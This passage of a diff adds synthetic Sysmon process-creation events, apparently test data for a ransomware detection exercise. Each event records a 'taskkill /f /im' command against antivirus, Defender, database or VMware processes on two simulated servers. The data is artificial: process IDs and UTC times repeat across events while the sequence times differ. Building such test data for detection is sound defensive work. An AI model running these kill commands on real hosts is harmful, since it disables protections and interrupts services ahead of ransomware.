+            "ParentImage": "C:\\Windows\\System32\\cmd.exe"
+          }
+        },
+        "agent": {
+          "name": "DC01",
+          "id": "003"
+        },
+        "timestamp": "2026-01-30T11:17:30.000+0000",
+        "_fomorian_test": true,
+        "_fomorian_engagement": "ransomware",
+        "_fomorian_phase": "defense-evasion"
+      }
+    },
+    {
+      "_comment": "Kill process: avastsvc.exe",
+      "sequence": 25,
+      "relative_time": "T+3:30:00",
+      "timestamp": "2026-01-30T11:30:00Z",
+      "log": {
+        "winlog": {
+          "channel": "Microsoft-Windows-Sysmon/Operational",
+          "event_id": 1,
+          "provider_name": "Microsoft-Windows-Sysmon",
+          "computer_name": "DC01.example.local",
+          "event_data": {
+            "UtcTime": "2026-01-30 12:09:35.683",
+            "ProcessGuid": "{C257A465-DC01-0059-C1B45DA47DC5}",
+            "ProcessId": "6938",
+            "Image": "C:\\Windows\\System32\\taskkill.exe",
+            "CommandLine": "taskkill /f /im avastsvc.exe",
+            "CurrentDirectory": "C:\\Windows\\System32\\",
+            "User": "NT AUTHORITY\\SYSTEM",
+            "IntegrityLevel": "System",
+            "ParentProcessGuid": "{C257A465-DC01-0058-C5B67F4F8F92}",
+            "ParentProcessId": "6821",
+            "ParentImage": "C:\\Windows\\System32\\cmd.exe"
+          }
+        },
+        "agent": {
+          "name": "DC01",
+          "id": "003"
+        },
+        "timestamp": "2026-01-30T11:30:00.000+0000",
+        "_fomorian_test": true,
+        "_fomorian_engagement": "ransomware",
+        "_fomorian_phase": "defense-evasion"
+      }
+    },
+    {
+      "_comment": "Kill process: sqlservr.exe",
+      "sequence": 26,
+      "relative_time": "T+3:43:00",
+      "timestamp": "2026-01-30T11:43:00Z",
+      "log": {
+        "winlog": {
+          "channel": "Microsoft-Windows-Sysmon/Operational",
+          "event_id": 1,
+          "provider_name": "Microsoft-Windows-Sysmon",
+          "computer_name": "DC01.example.local",
+          "event_data": {
+            "UtcTime": "2026-01-30 12:09:35.683",
+            "ProcessGuid": "{C257A465-DC01-0059-C1B45DA47DC5}",
+            "ProcessId": "6938",
+            "Image": "C:\\Windows\\System32\\taskkill.exe",
+            "CommandLine": "taskkill /f /im sqlservr.exe",
+            "CurrentDirectory": "C:\\Windows\\System32\\",
+            "User": "NT AUTHORITY\\SYSTEM",
+            "IntegrityLevel": "System",
+            "ParentProcessGuid": "{C257A465-DC01-0058-C5B67F4F8F92}",
+            "ParentProcessId": "6821",
+            "ParentImage": "C:\\Windows\\System32\\cmd.exe"
+          }
+        },
+        "agent": {
+          "name": "DC01",
+          "id": "003"
+        },
+        "timestamp": "2026-01-30T11:43:00.000+0000",
+        "_fomorian_test": true,
+        "_fomorian_engagement": "ransomware",
+        "_fomorian_phase": "defense-evasion"
+      }
+    },
+    {
+      "_comment": "Kill process: oracle.exe",
+      "sequence": 27,
+      "relative_time": "T+3:56:30",
+      "timestamp": "2026-01-30T11:56:30Z",
+      "log": {
+        "winlog": {
+          "channel": "Microsoft-Windows-Sysmon/Operational",
+          "event_id": 1,
+          "provider_name": "Microsoft-Windows-Sysmon",
+          "computer_name": "DC01.example.local",
+          "event_data": {
+            "UtcTime": "2026-01-30 12:09:35.683",
+            "ProcessGuid": "{C257A465-DC01-0059-C1B45DA47DC5}",
+            "ProcessId": "6938",
+            "Image": "C:\\Windows\\System32\\taskkill.exe",
+            "CommandLine": "taskkill /f /im oracle.exe",
+            "CurrentDirectory": "C:\\Windows\\System32\\",
+            "User": "NT AUTHORITY\\SYSTEM",
+            "IntegrityLevel": "System",
+            "ParentProcessGuid": "{C257A465-DC01-0058-C5B67F4F8F92}",
+            "ParentProcessId": "6821",
+            "ParentImage": "C:\\Windows\\System32\\cmd.exe"
+          }
+        },
+        "agent": {
+          "name": "DC01",
+          "id": "003"
+        },
+        "timestamp": "2026-01-30T11:56:30.000+0000",
+        "_fomorian_test": true,
+        "_fomorian_engagement": "ransomware",
+        "_fomorian_phase": "defense-evasion"
+      }
+    },
+    {
+      "_comment": "Kill process: vmware-vmx.exe",
+      "sequence": 28,
+      "relative_time": "T+4:10:30",
+      "timestamp": "2026-01-30T12:10:30Z",
+      "log": {
+        "winlog": {
+          "channel": "Microsoft-Windows-Sysmon/Operational",
+          "event_id": 1,
+          "provider_name": "Microsoft-Windows-Sysmon",
+          "computer_name": "DC01.example.local",
+          "event_data": {
+            "UtcTime": "2026-01-30 12:09:35.683",
+            "ProcessGuid": "{C257A465-DC01-0059-C1B45DA47DC5}",
+            "ProcessId": "6938",
+            "Image": "C:\\Windows\\System32\\taskkill.exe",
+            "CommandLine": "taskkill /f /im vmware-vmx.exe",
+            "CurrentDirectory": "C:\\Windows\\System32\\",
+            "User": "NT AUTHORITY\\SYSTEM",
+            "IntegrityLevel": "System",
+            "ParentProcessGuid": "{C257A465-DC01-0058-C5B67F4F8F92}",
+            "ParentProcessId": "6821",
+            "ParentImage": "C:\\Windows\\System32\\cmd.exe"
+          }
+        },
+        "agent": {
+          "name": "DC01",
+          "id": "003"
+        },
+        "timestamp": "2026-01-30T12:10:30.000+0000",
+        "_fomorian_test": true,
+        "_fomorian_engagement": "ransomware",
+        "_fomorian_phase": "defense-evasion"
+      }
+    },
+    {
+      "_comment": "Kill process: msmpeng.exe",
+      "sequence": 29,
+      "relative_time": "T+4:25:00",
+      "timestamp": "2026-01-30T12:25:00Z",
+      "log": {
+        "winlog": {
+          "channel": "Microsoft-Windows-Sysmon/Operational",
+          "event_id": 1,
+          "provider_name": "Microsoft-Windows-Sysmon",
+          "computer_name": "FILESERVER01.example.local",
+          "event_data": {
+            "UtcTime": "2026-01-30 12:12:40.082",
+            "ProcessGuid": "{C257A465-FS01-0067-E39625890D4A}",
+            "ProcessId": "7721",
+            "Image": "C:\\Windows\\System32\\taskkill.exe",
+            "CommandLine": "taskkill /f /im msmpeng.exe",
+            "CurrentDirectory": "C:\\Windows\\System32\\",
+            "User": "NT AUTHORITY\\SYSTEM",
+            "IntegrityLevel": "System",
+            "ParentProcessGuid": "{C257A465-FS01-0066-49EB24B80D25}",
+            "ParentProcessId": "7623",
+            "ParentImage": "C:\\Windows\\System32\\cmd.exe"
+          }
+        },
+        "agent": {
+          "name": "FS01",
+          "id": "004"
+        },
+        "timestamp": "2026-01-30T12:25:00.000+0000",
+        "_fomorian_test": true,
+        "_fomorian_engagement": "ransomware",
+        "_fomorian_phase": "defense-evasion"
+      }
+    },
+    {
+      "_comment": "Kill process: savservice.exe",
+      "sequence": 30,
+      "relative_time": "T+4:40:00",
+      "timestamp": "2026-01-30T12:40:00Z",
+      "log": {
+        "winlog": {
+          "channel": "Microsoft-Windows-Sysmon/Operational",
+          "event_id": 1,
+          "provider_name": "Microsoft-Windows-Sysmon",
+          "computer_name": "FILESERVER01.example.local",
+          "event_data": {
+            "UtcTime": "2026-01-30 12:12:40.082",
+            "ProcessGuid": "{C257A465-FS01-0067-E39625890D4A}",
+            "ProcessId": "7721",
+            "Image": "C:\\Windows\\System32\\taskkill.exe",
+            "CommandLine": "taskkill /f /im savservice.exe",
+            "CurrentDirectory": "C:\\Windows\\System32\\",
+            "User": "NT AUTHORITY\\SYSTEM",
+            "IntegrityLevel": "System",
+            "ParentProcessGuid": "{C257A465-FS01-0066-49EB24B80D25}",
+            "ParentProcessId": "7623",
+            "ParentImage": "C:\\Windows\\System32\\cmd.exe"
+          }
+        },
+        "agent": {
+          "name": "FS01",
+          "id": "004"
+        },
+        "timestamp": "2026-01-30T12:40:00.000+0000",
+        "_fomorian_test": true,
+        "_fomorian_engagement": "ransomware",
+        "_fomorian_phase": "defense-evasion"
+      }
+    },
+    {
+      "_comment": "Kill process: ccsvchst.exe",
+      "sequence": 31,
+      "relative_time": "T+4:55:30",
+      "timestamp": "2026-01-30T12:55:30Z",
+      "log": {
+        "winlog": {
+          "channel": "Microsoft-Windows-Sysmon/Operational",
+          "event_id": 1,
+          "provider_name": "Microsoft-Windows-Sysmon",
+          "computer_name": "FILESERVER01.example.local",
+          "event_data": {
+            "UtcTime": "2026-01-30 12:12:40.082",
+            "ProcessGuid": "{C257A465-FS01-0067-E39625890D4A}",
+            "ProcessId": "7721",
+            "Image": "C:\\Windows\\System32\\taskkill.exe",
+            "CommandLine": "taskkill /f /im ccsvchst.exe",
+            "CurrentDirectory": "C:\\Windows\\System32\\",
+            "User": "NT AUTHORITY\\SYSTEM",
+            "IntegrityLevel": "System",
+            "ParentProcessGuid": "{C257A465-FS01-0066-49EB24B80D25}",
+            "ParentProcessId": "7623",
+            "ParentImage": "C:\\Windows\\System32\\cmd.exe"
+          }
+        },
+        "agent": {
+          "name": "FS01",
+          "id": "004"
+        },
+        "timestamp": "2026-01-30T12:55:30.000+0000",
+        "_fomorian_test": true,
+        "_fomorian_engagement": "ransomware",
+        "_fomorian_phase": "defense-evasion"
+      }
+    },
+    {
+      "_comment": "Kill process: avgnt.exe",
+      "sequence": 32,
+      "relative_time": "T+5:11:30",
+      "timestamp": "2026-01-30T13:11:30Z",
+      "log": {
+        "winlog": {
+          "channel": "Microsoft-Windows-Sysmon/Operational",
+          "event_id": 1,
+          "provider_name": "Microsoft-Windows-Sysmon",
+          "computer_name": "FILESERVER01.example.local",
+          "event_data": {
+            "UtcTime": "2026-01-30 12:12:40.082",
+            "ProcessGuid": "{C257A465-FS01-0067-E39625890D4A}",
+            "ProcessId": "7721",
+            "Image": "C:\\Windows\\System32\\taskkill.exe",
+            "CommandLine": "taskkill /f /im avgnt.exe",
+            "CurrentDirectory": "C:\\Windows\\System32\\",
+            "User": "NT AUTHORITY\\SYSTEM",
+            "IntegrityLevel": "System",
+            "ParentProcessGuid": "{C257A465-FS01-0066-49EB24B80D25}",
+            "ParentProcessId": "7623",
+            "ParentImage": "C:\\Windows\\System32\\cmd.exe"
+          }
+        },
+        "agent": {
+          "name": "FS01",
+          "id": "004"
+        },
+        "timestamp": "2026-01-30T13:11:30.000+0000",
+        "_fomorian_test": true,
+        "_fomorian_engagement": "ransomware",
+        "_fomorian_phase": "defense-evasion"
+      }
+    },
+    {
+      "_comment": "Kill process: avastsvc.exe",
+      "sequence": 33,
+      "relative_time": "T+5:28:00",
+      "timestamp": "2026-01-30T13:28:00Z",
+      "log": {
+        "winlog": {
+          "channel": "Microsoft-Windows-Sysmon/Operational",
+          "event_id": 1,
+          "provider_name": "Microsoft-Windows-Sysmon",
+          "computer_name": "FILESERVER01.example.local",
+          "event_data": {
+            "UtcTime": "2026-01-30 12:12:40.082",
+            "ProcessGuid": "{C257A465-FS01-0067-E39625890D4A}",
+            "ProcessId": "7721",
+            "Image": "C:\\Windows\\System32\\taskkill.exe",
+            "CommandLine": "taskkill /f /im avastsvc.exe",
+            "CurrentDirectory": "C:\\Windows\\System32\\",
+            "User": "NT AUTHORITY\\SYSTEM",
+            "IntegrityLevel": "System",
+            "ParentProcessGuid": "{C257A465-FS01-0066-49EB24B80D25}",
+            "ParentProcessId": "7623",
+            "ParentImage": "C:\\Windows\\System32\\cmd.exe"
+          }
+        },
+        "agent": {
+          "name": "FS01",
+          "id": "004"
+        },
+        "timestamp": "2026-01-30T13:28:00.000+0000",
+        "_fomorian_test": true,
+        "_fomorian_engagement": "ransomware",
+        "_fomorian_phase": "defense-evasion"
+      }
+    },
+    {
+      "_comment": "Kill process: sqlservr.exe",
+      "sequence": 34,
+      "relative_time": "T+5:45:00",
+      "timestamp": "2026-01-30T13:45:00Z",
+      "log": {
+        "winlog": {
+          "channel": "Microsoft-Windows-Sysmon/Operational",
+          "event_id": 1,
+          "provider_name": "Microsoft-Windows-Sysmon",
+          "computer_name": "FILESERVER01.example.local",
+          "event_data": {
+            "UtcTime": "2026-01-30 12:12:40.082",
+            "ProcessGuid": "{C257A465-FS01-0067-E39625890D4A}",
+            "ProcessId": "7721",
+            "Image": "C:\\Windows\\System32\\taskkill.exe",
+            "CommandLine": "taskkill /f /im sqlservr.exe",
+            "CurrentDirectory": "C:\\Windows\\System32\\",
+            "User": "NT AUTHORITY\\SYSTEM",
+            "IntegrityLevel": "System",
+            "ParentProcessGuid": "{C257A465-FS01-0066-49EB24B80D25}",
+            "ParentProcessId": "7623",
+            "ParentImage": "C:\\Windows\\System32\\cmd.exe"
+          }
+        },
+        "agent": {
+          "name": "FS01",
+          "id": "004"
+        },
+        "timestamp": "2026-01-30T13:45:00.000+0000",
+        "_fomorian_test": true,
+        "_fomorian_engagement": "ransomware",
+        "_fomorian_phase": "defense-evasion"
+      }
+    },
+    {
+      "_comment": "Kill process: oracle.exe",
+      "sequence": 35,
+      "relative_time": "T+6:02:30",
+      "timestamp": "2026-01-30T14:02:30Z",
+      "log": {
+        "winlog": {
+          "channel": "Microsoft-Windows-Sysmon/Operational",
+          "event_id": 1,
+          "provider_name": "Microsoft-Windows-Sysmon",
+          "computer_name": "FILESERVER01.example.local",
+          "event_data": {
+            "UtcTime": "2026-01-30 12:12:40.082",
+            "ProcessGuid": "{C257A465-FS01-0067-E39625890D4A}",
+            "ProcessId": "7721",
+            "Image": "C:\\Windows\\System32\\taskkill.exe",
+            "CommandLine": "taskkill /f /im oracle.exe",
+            "CurrentDirectory": "C:\\Windows\\System32\\",
+            "User": "NT AUTHORITY\\SYSTEM",
+            "IntegrityLevel": "System",
+            "ParentProcessGuid": "{C257A465-FS01-0066-49EB24B80D25}",
+            "ParentProcessId": "7623",
+            "ParentImage": "C:\\Windows\\System32\\cmd.exe"
+          }
+        },
+        "agent": {
+          "name": "FS01",
+          "id": "004"
+        },
+        "timestamp": "2026-01-30T14:02:30.000+0000",
+        "_fomorian_test": true,
+        "_fomorian_engagement": "ransomware",
+        "_fomorian_phase": "defense-evasion"
+      }
+    },
+    {
+      "_comment": "Kill process: vmware-vmx.exe",
+      "sequence": 36,
+      "relative_time": "T+6:20:30",
+      "timestamp": "2026-01-30T14:20:30Z",
+      "log": {
+        "winlog": {
+          "channel": "Microsoft-Windows-Sysmon/Operational",
+          "event_id": 1,
+          "provider_name": "Microsoft-Windows-Sysmon",
+          "computer_name": "FILESERVER01.example.local",
+          "event_data": {
+            "UtcTime": "2026-01-30 12:12:40.082",
+            "ProcessGuid": "{C257A465-FS01-0067-E39625890D4A}",
+            "ProcessId": "7721",
+            "Image": "C:\\Windows\\System32\\taskkill.exe",
+            "CommandLine": "taskkill /f /im vmware-vmx.exe",
+            "CurrentDirectory": "C:\\Windows\\System32\\",
+            "User": "NT AUTHORITY\\SYSTEM",
+            "IntegrityLevel": "System",
+            "ParentProcessGuid": "{C257A465-FS01-0066-49EB24B80D25}",
+            "ParentProcessId": "7623",
+            "ParentImage": "C:\\Windows\\System32\\cmd.exe"
+          }
+        },
+        "agent": {
+          "name": "FS01",
+          "id": "004"
+        },
+        "timestamp": "2026-01-30T14:20:30.000+0000",
+        "_fomorian_test": true,
+        "_fomorian_engagement": "ransomware",
+        "_fomorian_phase": "defense-evasion"
+      }
+    }
+  ]
+}
